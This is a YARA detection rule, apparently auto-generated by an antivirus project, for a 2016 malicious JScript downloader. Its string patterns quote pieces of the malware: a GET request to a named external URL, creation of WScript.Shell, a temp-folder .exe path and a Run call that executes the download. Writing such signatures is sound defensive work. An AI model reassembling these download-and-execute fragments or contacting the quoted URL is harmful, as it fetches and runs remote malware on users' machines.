rule sig_20160330_35cb8a8e94bbcee94aabf9390d943902 {
  meta:
    description = "datamaliciousorder - file 20160330_35cb8a8e94bbcee94aabf9390d943902.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "300aace7a78b7f2fe1c210b825c7bfb8a086db0fd3d54dd81f503260903d263b"

  strings:
    $s1  = "_RU[_S](\"GET\", \"http://shopyb.com/s6dlas\", false);" fullword ascii
    $s2  = "var _LZ = function _VB() {return WScript[_R0](\"WScript\"+\".Shell\");}(), _P = 11;" fullword ascii
    $s3  = "function _R(_NU, _NN){_VF = _VF * 1; return _NU - _NN;};" fullword ascii
    $s4  = "if (_RU[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _CQ(){return _Y0 + \"\";};" fullword ascii
    $s6  = "function _OH() {return _LZ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"7eI7lAGMt1t9V.ex\" + \"e\";};" fullword ascii
    $s7  = "function _D(_F0){_LZ[\"Run\"](_F0, _VF, _VF);};" fullword ascii
    $s8  = "function _H() {return ((_UH == true) && (_UH == _EU)) ? 1 : _VF;};" fullword ascii
    $s9  = "function _UW(_TD) {var _NT = (1, 2, 3, 4, 5, _TD); return _NT;};" fullword ascii
    $s10 = "function _LM(){return 22;};" fullword ascii
    $s11 = "function _ZU(){return _R0;};" fullword ascii
    $s12 = "function _Y()" fullword ascii
    $s13 = "return _R(_SE, _CL);" fullword ascii
    $s14 = " while (_MT){" fullword ascii
    $s15 = "var _VI = new this[\"Date\"]();" fullword ascii
    $s16 = "var _PD = false;" fullword ascii
    $s17 = "var _UH = false;" fullword ascii
    $s18 = "_EU = true; " fullword ascii
    $s19 = "var _EU = false;" fullword ascii
    $s20 = "_UH = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}